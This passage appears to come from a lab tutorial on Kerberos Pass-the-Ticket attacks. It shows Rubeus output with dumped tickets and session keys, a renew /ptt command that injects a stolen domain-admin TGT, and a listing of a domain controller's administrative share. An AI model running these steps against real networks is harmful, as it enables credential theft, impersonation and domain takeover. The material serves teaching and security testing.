	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:43:53 AM
	    EndTime                  :  1/21/2024 8:43:53 PM
	    RenewTill                :  1/28/2024 10:43:53 AM
	    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  z9b5FtIIzZ5WTVTHdgpIWVY0Lz6Eko969iMY4FYPTes=
	    Base64EncodedTicket   :

		 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

	  UserName                 : WS01$
	  Domain                   : INLANEFREIGHT
	  LogonId                  : 0x3e4
	  UserSID                  : S-1-5-20
	  AuthenticationPackage    : Negotiate
	  LogonType                : Service
	  LogonTime                : 1/21/2024 10:43:01 AM
	  LogonServer              :
	  LogonServerDNSDomain     :
	  UserPrincipalName        :  WS01$@INLANEFREIGHT.LOCA


	    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:44:16 AM
	    EndTime                  :  1/21/2024 8:44:16 PM
	    RenewTill                :  1/28/2024 10:44:16 AM
	    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  JFkCU+3bhTvNkapqf0ngfboY5LLcIdZhkhVGXxuBOL0=
	    Base64EncodedTicket   :

		 doIFxjCCBcKgAwIBBaEDAgEWooIEuTCCBLVhggSxMIIEraADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRjMIIEX6ADAgESoQMCAQKiggRRBIIETdLQlb8UvVwrhAorLGWiQzwBon2GPKPIK/w3H1HCecgfAx2TcmPR370LpXWaF1Q8Whbw6FgXYn+zjF+Jn/vutuPi+s24BWeTt4FtNjIvf4JKgDrhQrFgjRZFh21U4w0XP24az4ai7dOV4OZdbzxUYRBI46fM+v7hFz7P5yFgU4s/8z9xkyGCpG0QvYip1BVIXZNapBX3cRvu98/B1Kk36/lc9JRqc+ZczUhLBD0hH61iy/wWKxb8VgbnUb809ozFO83kNztNvjfQSxSEyXVQVhCrHdpG5Vk1CGbpIA5gjDqfeWVYE1obp1SY+v5EzG8B0VxDNkdSJWOR5bjJ+3IEN+EapyRmLbCybNDjIFa6VQZkcAk8wwbk5161JsLHxXFIzgxten2YM3MTA1fijOAhZkMrm6kohsYV4UkEvx8CzdXvQ9s382mtAutfHqbDK9qykeeMzTrNyQKSnu1JXnhvgeKMxbPVILyYc3Lo70I5FCIRS0UCKQCoDeFEznl4squb961NmJCmIl4Msx7KaNIu+HzmO2u1E3o+Xo95sUtPVNz/XgySYsPuXHJH0vO3TStF+W/iUdORXFFqX+VxfuZbZir6XAxyv6OMOqf94fQSsYa53bMei6qNDtfA3RqQP5eFxXUNa+yhF3W+imos3Ge0oHwzv+RNdeb8mYQFaKNwh5uTlSAUY4p4/3WucG2a+36VKrIQRSFM4u24Abz3JW+1BpcOx1Yp/LROmls4trLnZzs7NBzbswx9V9JC7Ca5SoIwxuSNNIg0vs4arTCf8Jvgh67A6ZNc/OaA0GZ/7g2pbx9D9Jb10+m9ko/IpMIwhgfgNU3diEyuI4gQ7D7YnfHr7Uf+Ax6URCDslU0AkouvXyHcxwWWJbdRJcCEFzyBFvNnOXRmdtUz3GuICi2xSuaDCbYcG5KPSiCW7NXUpCZpaDDjJZXRIXx368L9HeQ/9YrEy6JE3bB6grJ19YQBJei8ZcG+4datNQ65a0tTdbMY7ral2nC2GLVnfoPDXOQI0Uw/VJNgBNfxkIatVDJJFQKkq3YPmwRa4XL1ZgcVOnCFH86DJcfzw6AEaWYBhVMurz0/Iexoei6lMbQZNRIU0C5tyoLiaTHa0v1ZXb9auUiLdsX2NSD1ECZv9DpbaMg8pxRTwlVo8WGkpYlhzWvTs6ZV8kT/aKZVFvvQ7szbIac+h8hxPsz07S4oVeV6LzmtVgEdeeo/dGYRUhWXbKAFXTceSYSczdFVaLPxQcmUrsfEgepOT0GyZUrgnJx19dn4GPq6PXi0HOqc4GUIJtvrYdXpbNqZrXoNr9qikHurwMHh6MeTzEwEbLS1j/qJNeGXG0A9icmAiwtoWtM2WrNoZ4prUNd+580rWQWqTegVdpmaDW2w7gL+KVOMTZmxECrg+AKG0IZZR293cgOoW/SuiVSJG2P6ReSOppzW87vUoqqp4VwPrrL2Wy0vz11ekRCrCaOB+DCB9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEICRZAlPt24U7zZGqan9J4H26GOSy3CHWYZIVRl8bgTi9oRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVXUzAxJKMHAwUAQOEAAKURGA8yMDI0MDEyMTE2NDQxNlqmERgPMjAyNDAxMjIwMjQ0MTZapxEYDzIwMjQwMTI4MTY0NDE2WqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM


	    ServiceName              :  cifs/DC01.INLANEFREIGHT.LOCAL
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:44:16 AM
	    EndTime                  :  1/21/2024 8:44:16 PM
	    RenewTill                :  1/28/2024 10:44:16 AM
	    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  X+XTeD1aqi5os1TkIqzdCXLmShKPtFFJM3QHEV3yk9w=
	    Base64EncodedTicket   :

		 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





![Rubeus Extract Tickets](/Ticket-Abuse/Pass-the-Ticket/images/rubeus-dump-tickets.png) 




We can then use Rubeus to ask for a new valid TGT using the one we just extracted with the following little trick: We will utilize the renewal functionality of Kerberos by providing our TGT, and we'll receive a brand new one for the same user.

 

	C:\Tools>Rubeus.exe renew /ticket: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 /ptt

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2

	[*] Action: Renew Ticket

	[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
	[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\jefferson.matts'
	[+] TGT renewal request successful!
	[*] base64(ticket.kirbi):

		 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
	[+] Ticket successfully imported!




![Rubeus ptt](/Ticket-Abuse/Pass-the-Ticket/images/rubeus-ptt.png) 
![Rubeus ptt](/Ticket-Abuse/Pass-the-Ticket/images/rubeus-ptt-2.png) 



Rerun **klist** to confirm that the ticket for the target user is now in our current session. 


## Displaying the Ticket with klist 


	C:\Tools>klist

	Current LogonId is 0:0xb41f8

	Cached Tickets: (1)

	#0>     Client: jefferson.matts @ INLANEFREIGHT.LOCAL
		   Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
		   KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		   Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
		   Start Time: 1/21/2024 11:09:34 (local)
		   End Time:   1/21/2024 21:09:34 (local)
		   Renew Time: 1/28/2024 11:01:05 (local)
		   Session Key Type: AES-256-CTS-HMAC-SHA1-96
		   Cache Flags: 0x1 -> PRIMARY
		   Kdc Called:





![klist](/Ticket-Abuse/Pass-the-Ticket/images/klist-2.png) 


Now that we have this TGT in memory, we can perform any action on behalf of the impersonated user **jefferson.matts**. For example, we can read a Domain Controller's file system because **jefferson.matts** is a domain administrator. 


	C:\Tools>dir \\dc01.inlanefreight.local\c$\Users\Administrator
	 Volume in drive \\dc01.inlanefreight.local\c$ has no label.
	 Volume Serial Number is 54FC-41C7

	 Directory of \\dc01.inlanefreight.local\c$\Users\Administrator

	10/14/2022  09:46 AM    <DIR>          .
	10/14/2022  09:46 AM    <DIR>          ..
	10/14/2022  09:46 AM    <DIR>          3D Objects
	10/14/2022  09:46 AM    <DIR>          Contacts
	10/14/2022  09:46 AM    <DIR>          Desktop
	04/04/2023  10:33 AM    <DIR>          Documents
	04/12/2023  02:00 PM    <DIR>          Downloads
	10/14/2022  09:46 AM    <DIR>          Favorites
	10/14/2022  09:46 AM    <DIR>          Links
	10/14/2022  09:46 AM    <DIR>          Music
	10/14/2022  09:46 AM    <DIR>          Pictures
	10/14/2022  09:46 AM    <DIR>          Saved Games
	10/14/2022  09:46 AM    <DIR>          Searches
	10/14/2022  09:46 AM    <DIR>          Videos
		          0 File(s)              0 bytes
		         14 Dir(s)   3,018,326,016 bytes free





![exploit](/Ticket-Abuse/Pass-the-Ticket/images/exploit.png) 

